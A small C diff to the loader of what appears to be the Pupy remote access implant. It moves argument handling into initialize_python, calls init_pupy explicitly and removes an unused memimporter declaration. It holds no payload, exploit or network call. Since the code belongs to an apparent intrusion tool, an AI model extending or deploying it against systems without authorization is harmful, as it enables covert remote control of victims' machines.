@@ -22,7 +22,6 @@
 #include "Python-dynload.c"
 #include "revision.h"
 
-extern DL_EXPORT(void) init_memimporter(void);
 extern DL_EXPORT(void) init_pupy(void);
 
 uint32_t mainThread(int argc, char *argv[], bool so) {
@@ -40,12 +39,14 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
     setrlimit(RLIMIT_CORE, &lim);
 
     dprint("Initializing python...\n");
-    if (!initialize_python()) {
+    if (!initialize_python(argc, argv, so)) {
         return -1;
     }
 
+    init_pupy();
+
     dprint("Running pupy...\n");
-    run_pupy(argc, argv, so);
+    run_pupy();
 
     dprint("Global Exit\n");
     return 0;
